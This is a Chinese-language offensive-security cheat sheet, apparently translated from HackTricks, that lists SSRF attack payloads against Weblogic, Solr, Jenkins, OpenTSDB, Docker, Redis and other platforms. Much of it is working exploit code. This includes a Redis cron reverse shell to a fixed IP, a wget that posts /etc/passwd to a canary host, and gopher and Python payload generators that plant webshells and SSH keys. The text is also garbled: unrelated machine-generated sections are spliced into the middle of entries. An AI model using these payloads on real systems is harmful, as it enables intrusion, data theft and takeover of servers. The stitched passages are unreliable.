# SSRF易受攻击的平台

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

这一部分内容来自[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**常用绑定端口：9200**

当Elasticsearch在内部部署时，通常不需要身份验证。

如果你有一个部分盲目的SSRF，可以确定状态码，请检查以下端点是否返回200：
```http
/_cluster/health
/_cat/indices
/_cat/health
```
如果你有一个盲目的SSRF，可以发送POST请求，你可以通过向以下路径发送POST请求来关闭Elasticsearch实例：

注意：`_shutdown` API已从Elasticsearch版本2.x及以上中删除。这仅适用于Elasticsearch 1.6及以下版本：
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**常见绑定端口：80、443（SSL）、7001、8888**

**SSRF金丝雀：UDDI Explorer（CVE-2014-4210）**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
这个方法也适用于GET请求：
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
这个端点也容易受到CRLF注入攻击：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
将导致以下请求：
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF金丝雀：CVE-2020-14883**

来自[这里](https://forum.90sec.com/t/topic/1412)。

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windows是一种广泛使用的操作系统，因此存在许多容易受到SSRF攻击的平台。以下是一些常见的受漏洞影响的Windows平台：

- IIS（Internet Information Services）：IIS是Windows上常用的Web服务器。通过利用IIS的漏洞，攻击者可以执行SSRF攻击。
- SMB（Server Message Block）：SMB是Windows上用于文件共享和网络通信的协议。通过利用SMB的漏洞，攻击者可以发起SSRF攻击。
- MSSQL（Microsoft SQL Server）：MSSQL是Windows上常用的关系型数据库管理系统。通过利用MSSQL的漏洞，攻击者可以进行SSRF攻击。
- Exchange Server：Exchange Server是Windows上常用的邮件服务器。通过利用Exchange Server的漏洞，攻击者可以执行SSRF攻击。

这些平台的漏洞可能导致攻击者能够发送恶意请求，从而访问内部资源或攻击其他系统。因此，对于这些平台，确保及时修补漏洞和实施安全措施非常重要。
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**常见绑定端口：8500，8501（SSL）**

可以在[这里](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)找到详细说明。

## Shellshock

**常见绑定端口：80，443（SSL），8080**

为了有效地测试Shellshock，您可能需要添加一个包含有效载荷的头部。以下CGI路径值得尝试：

测试的CGI路径的简短列表：

[Gist包含路径](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4)。

**SSRF Canary：通过用户代理的Shellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**常见绑定端口：80、8080、8888、8082**

查看Apache Druid的API参考文档[此处](https://druid.apache.org/docs/latest/operations/api-reference.html)。

如果您可以查看状态码，请检查以下路径，看它们是否返回200状态码：
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
关闭任务，需要猜测任务ID或数据源名称：
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
关闭Apache Druid Overlords上的监督程序：
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**常见绑定端口：8983**

**SSRF金丝雀：Shards参数**

> 补充一下shubham所说的 - 扫描solr相对容易。有一个shards=参数，允许你反弹SSRF到SSRF，以验证你是否盲目地攻击了solr实例。
>
> — Хавиж Наффи 🥕 (@nnwakelam) [2021年1月13日](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

来源：[这里](https://github.com/veracode-research/solr-injection)
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF金丝雀：Solr XXE（2017）**

[Apache Solr 7.0.1 XXE（Packetstorm）](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**通过dataImportHandler实现远程代码执行（RCE）**

[通过dataImportHandler实现远程代码执行的研究](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**常见绑定端口：80、443（SSL）**

取自这篇研究[文章](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)。

**SSRF Canary：XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
**SSRF金丝雀：XXE #2**

---

## SSRF Vulnerable Platforms

## SSRF易受攻击的平台

The following is a list of platforms that are commonly found to be vulnerable to Server-Side Request Forgery (SSRF) attacks. These platforms often allow users to make requests to arbitrary URLs, which can be exploited to perform SSRF attacks.

以下是常见易受Server-Side Request Forgery (SSRF)攻击的平台列表。这些平台通常允许用户向任意URL发出请求，这可以被利用来执行SSRF攻击。

### 1. Localhost

### 1. 本地主机

The `localhost` or loopback address (`127.0.0.1`) is often vulnerable to SSRF attacks. This is because many applications use the `localhost` address to communicate with internal services or resources. By exploiting SSRF vulnerabilities, an attacker can make requests to internal services and potentially gain unauthorized access.

`localhost`或回环地址（`127.0.0.1`）通常容易受到SSRF攻击。这是因为许多应用程序使用`localhost`地址与内部服务或资源进行通信。通过利用SSRF漏洞，攻击者可以向内部服务发出请求，并有可能获得未经授权的访问权限。

### 2. Private IP Addresses

### 2. 私有IP地址

Private IP addresses, such as those in the `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16` ranges, are often vulnerable to SSRF attacks. These addresses are commonly used for internal networks and are not meant to be accessed from the internet. However, if an application allows users to make requests to private IP addresses, an attacker can abuse this functionality to perform SSRF attacks.

私有IP地址，例如`10.0.0.0/8`，`172.16.0.0/12`和`192.168.0.0/16`范围内的地址，通常容易受到SSRF攻击。这些地址通常用于内部网络，并不适合从互联网访问。然而，如果一个应用程序允许用户向私有IP地址发出请求，攻击者可以滥用这个功能来执行SSRF攻击。

### 3. Metadata Endpoints

### 3. 元数据端点

Metadata endpoints, such as the AWS EC2 metadata endpoint (`http://169.254.169.254/latest/meta-data/`) or the Google Cloud metadata endpoint (`http://metadata.google.internal/computeMetadata/v1/`), are often vulnerable to SSRF attacks. These endpoints provide information about the instance or virtual machine running the application. By exploiting SSRF vulnerabilities, an attacker can retrieve sensitive information from these metadata endpoints.

元数据端点，例如AWS EC2元数据端点（`http://169.254.169.254/latest/meta-data/`）或Google Cloud元数据端点（`http://metadata.google.internal/computeMetadata/v1/`），通常容易受到SSRF攻击。这些端点提供有关运行应用程序的实例或虚拟机的信息。通过利用SSRF漏洞，攻击者可以从这些元数据端点中获取敏感信息。

### 4. File Protocols

### 4. 文件协议

Some applications allow users to make requests to file protocols, such as `file://`, `ftp://`, or `smb://`. These protocols can be abused to perform SSRF attacks by accessing local files or network resources that should not be exposed to the internet.

一些应用程序允许用户向文件协议（如`file://`，`ftp://`或`smb://`）发出请求。通过访问不应暴露在互联网上的本地文件或网络资源，可以滥用这些协议来执行SSRF攻击。

### 5. Cloud Metadata Services

### 5. 云元数据服务

Cloud metadata services, such as the Azure Instance Metadata Service (`http://169.254.169.254/metadata/instance?api-version=2019-06-01`) or the DigitalOcean metadata service (`http://169.254.169.254/metadata/v1/`), are often vulnerable to SSRF attacks. These services provide information about the cloud instance or droplet running the application. By exploiting SSRF vulnerabilities, an attacker can retrieve sensitive information from these metadata services.

云元数据服务，例如Azure实例元数据服务（`http://169.254.169.254/metadata/instance?api-version=2019-06-01`）或DigitalOcean元数据服务（`http://169.254.169.254/metadata/v1/`），通常容易受到SSRF攻击。这些服务提供有关运行应用程序的云实例或droplet的信息。通过利用SSRF漏洞，攻击者可以从这些元数据服务中获取敏感信息。

### 6. SSRF Testing Platforms

### 6. SSRF测试平台

There are also specific platforms designed for testing SSRF vulnerabilities, such as `http://ssrf.local` or `http://ssrfpoc.com`. These platforms are intentionally vulnerable and can be used to practice and demonstrate SSRF attacks.

还有一些专门用于测试SSRF漏洞的平台，例如`http://ssrf.local`或`http://ssrfpoc.com`。这些平台是有意设定为易受攻击的，可以用于练习和演示SSRF攻击。

---

**References:**

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来自[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF Canary: Struts2-016**：

将此附加到您所知道的每个内部端点/URL的末尾：
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来自[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF金丝雀：从URL部署WAR文件**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF金丝雀：Sharelinks（适用于2016年11月及之前发布的Confluence版本）**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF金丝雀：iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian安全票据OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet - Jira < 7.3.5（CVE-2017-9506）**

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF金丝雀：makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian安全票据JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## 其他 Atlassian 产品

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet（CVE-2017-9506）**：

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**常见绑定端口：4242**

[OpenTSDB远程代码执行](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF金丝雀：通过RCE进行curl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 远程代码执行](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF 金丝雀：通过 RCE 进行 curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**常见绑定端口：80、443（SSL）、8080、8888**

[这里](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)有一篇很棒的文章。

**SSRF 金丝雀：CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

按照这里的指示通过GET实现RCE：[Hacking Jenkins Part 2 - 滥用元编程实现未经身份验证的RCE！](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**通过Groovy实现远程命令执行（RCE）**

In some cases, SSRF vulnerabilities can be exploited to achieve Remote Code Execution (RCE) by leveraging the Groovy scripting language. Groovy is often used in Java applications for scripting purposes.

在某些情况下，可以利用SSRF漏洞来实现远程命令执行（RCE），通过利用Groovy脚本语言。Groovy经常用于Java应用程序的脚本编写。

To exploit this vulnerability, you need to identify a SSRF vulnerability that allows you to make requests to internal resources. Once you have identified such a vulnerability, you can use Groovy's ability to execute arbitrary code to achieve RCE.

要利用这个漏洞，你需要找到一个允许你向内部资源发起请求的SSRF漏洞。一旦你找到了这样的漏洞，你可以利用Groovy执行任意代码来实现远程命令执行。

Here is an example of how to achieve RCE using Groovy:

下面是一个使用Groovy实现远程命令执行的示例：

```groovy
import java.lang.ProcessBuilder

def command = "ls -la"
def process = new ProcessBuilder(command.split(" ")).redirectErrorStream(true).start()
def output = process.inputStream.text

println output
```

In this example, the Groovy script executes the "ls -la" command, which lists the files and directories in the current directory. You can replace this command with any other command you want to execute on the target system.

在这个示例中，Groovy脚本执行了"ls -la"命令，该命令列出了当前目录中的文件和目录。你可以将这个命令替换为你想在目标系统上执行的任何其他命令。

To exploit the SSRF vulnerability, you need to find a way to make the Groovy script execute on the target system. This can be done by injecting the script into a vulnerable parameter or by uploading a file containing the script and then executing it.

要利用SSRF漏洞，你需要找到一种方法让Groovy脚本在目标系统上执行。可以通过将脚本注入到一个有漏洞的参数中，或者通过上传包含脚本的文件然后执行它来实现。

Remember that exploiting SSRF vulnerabilities for RCE is highly dependent on the specific context and the security measures in place. It is important to thoroughly understand the target system and its vulnerabilities before attempting any exploitation.

请记住，利用SSRF漏洞实现远程命令执行高度依赖于特定的上下文和现有的安全措施。在尝试任何利用之前，充分了解目标系统及其漏洞是非常重要的。
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix 仪表板

**常见绑定端口：80、443（SSL）、8080**

Spring Cloud Netflix，版本 2.2.x 在 2.2.4 之前，版本 2.1.x 在 2.1.6 之前。

**SSRF 金丝雀：CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**常见绑定端口：80、443（SSL）**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary: CVE-2019-6715**

这需要是一个PUT请求：
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF金丝雀**

此漏洞的公告在此处发布：[W3 Total Cache SSRF漏洞](https://klikki.fi/adv/w3\_total\_cache.html)

此PHP代码将为您的SSRF金丝雀主机生成有效载荷（将`url`替换为您的金丝雀主机）：
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**常见绑定端口：2375，2376（SSL）**

如果你遇到部分盲的SSRF，你可以使用以下路径来验证Docker API的存在：
```bash
/containers/json
/secrets
/services
```
**通过运行任意的Docker镜像实现远程命令执行（RCE）**

In some cases, a vulnerable SSRF can be exploited to run an arbitrary Docker image, which can lead to remote command execution (RCE) on the server. This occurs when the SSRF vulnerability allows the attacker to specify a URL that points to a Docker image, which is then pulled and executed by the server.

在某些情况下，可以利用存在漏洞的SSRF来运行任意的Docker镜像，从而导致服务器上的远程命令执行（RCE）。当SSRF漏洞允许攻击者指定一个指向Docker镜像的URL时，服务器会拉取并执行该镜像。

To exploit this vulnerability, the attacker needs to find a way to make the server pull and execute the Docker image. This can be achieved by providing a malicious URL as the SSRF target, which points to a Docker image hosted on a remote server controlled by the attacker.

为了利用这个漏洞，攻击者需要找到一种方法让服务器拉取并执行Docker镜像。这可以通过将恶意URL作为SSRF目标提供，该URL指向由攻击者控制的远程服务器上的Docker镜像。

Once the server pulls the Docker image, the attacker can include a payload or command within the image that will be executed by the server. This allows the attacker to execute arbitrary commands on the server, potentially gaining full control over it.

一旦服务器拉取了Docker镜像，攻击者可以在镜像中包含一个将由服务器执行的有效载荷或命令。这使得攻击者可以在服务器上执行任意命令，潜在地完全控制服务器。

To prevent this type of attack, it is important to properly validate and sanitize any user-supplied input, especially when it is used to construct URLs or make requests to external resources. Additionally, restricting the server's access to external resources and implementing proper access controls can help mitigate the risk of SSRF vulnerabilities.
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
将alpine替换为您希望Docker容器运行的任意镜像。

## Gitlab Prometheus Redis Exporter

**常见绑定端口：9121**

此漏洞影响Gitlab版本13.1.1之前的实例。根据[Gitlab文档](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)的说明，`从GitLab 9.0开始，默认情况下启用Prometheus及其导出器`。

这些导出器为攻击者提供了一个绝佳的方法，可以使用CVE-2020-13379来转向并攻击其他服务。其中一个容易受到攻击的导出器是Redis导出器。

通过以下端点，攻击者可以通过目标参数来转储redis服务器中的所有键：
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
**通过Gopher可能实现**

## Redis

**常见绑定端口：6379**

推荐阅读：

* [尝试通过HTTP请求来攻击Redis](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [针对Redis的SSRF漏洞利用](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**通过Cron实现远程命令执行（RCE）** - [Gopher攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:

Gopher是一种协议，用于在互联网上检索文档。它类似于HTTP，但功能较为简单。SSRF漏洞通常可以利用Gopher协议来发起请求，从而导致服务器端请求伪造（SSRF）攻击。以下是一些容易受到SSRF攻击的平台和框架：

- PHP：在使用file_get_contents()或curl_exec()等函数时，未对用户输入进行适当的过滤和验证。
- Java：在使用URL类或HttpURLConnection类时，未对用户输入进行适当的过滤和验证。
- Ruby：在使用open-uri库时，未对用户输入进行适当的过滤和验证。
- Python：在使用urllib库或requests库时，未对用户输入进行适当的过滤和验证。
- Node.js：在使用http或https模块时，未对用户输入进行适当的过滤和验证。
- Ruby on Rails：在使用open-uri库时，未对用户输入进行适当的过滤和验证。
- Django：在使用urllib库或requests库时，未对用户输入进行适当的过滤和验证。

要防止SSRF攻击，应该始终对用户输入进行严格的过滤和验证，确保只允许访问可信任的资源。
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**通过Shell上传实现远程命令执行（PHP）** - [Redis Getshell概述](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过 authorized\_keys 进行远程命令执行（RCE）** - [Redis Getshell 概述](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过Git协议在GitLab上实现远程代码执行（RCE）**

[这里](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)是Liveoverflow的精彩解读。

虽然这需要对GitLab进行身份验证才能利用，但我在这里包含了有效载荷，因为`git`协议可能适用于您正在攻击的目标。此有效载荷仅供参考。
```bash
